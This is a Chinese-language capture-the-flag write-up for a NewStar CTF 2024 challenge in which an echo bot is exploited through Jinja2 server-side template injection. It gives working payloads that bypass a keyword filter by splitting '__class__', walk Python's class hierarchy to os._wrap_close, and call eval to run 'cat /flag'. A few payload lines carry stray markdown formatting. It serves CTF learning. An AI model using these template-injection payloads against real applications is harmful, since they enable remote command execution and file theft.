---
titleTemplate: ':title | WriteUp - NewStar CTF 2024'
---
# 复读机

可以看到，输入什么就输出什么

输入`{{ '{'+'{ 7*7 }'+'}' }}`的时候 输出的结果是49 说明存在ssti注入

当输入

`{{ '{'+'{[].__class__}'+'}' }}`

发现bot显示不喜欢上课 说明class被过滤了 可以使用简单的拼接绕过

{{[]['__cl'+'ass__']}['__cl'+'ass__']}

得到list类

![简单的ssti](/assets/images/wp/2024/week2/fuduji_1.png)

后面就是基本的注入方法了

获取object类

{{()['__cl'+'ass__']['__base__']}}

{{()['__cl'+'ass__']['__base__']['__**subcl'+'asses__**']}}

![img](/assets/images/wp/2024/week2/fuduji_2.png)

找一个可以利用的类 这里选用 os._wrap_close

{{()['__cl'+'ass__']['__base__']['__**subcl'+'asses__**'][132]}}

![img](/assets/images/wp/2024/week2/fuduji_3.png)

然后就是拿到eval方法 命令执行就行

```python
{{()['__cl'+'ass__']['__base__']['__subcl'+'asses__']()[132]['__init__']['__globals__']['__builtins__']['eval']("__import__('os').popen('cat /flag').read()")}}
```

![img](/assets/images/wp/2024/week2/fuduji_4.png)

方法很多，大家可以自己试试
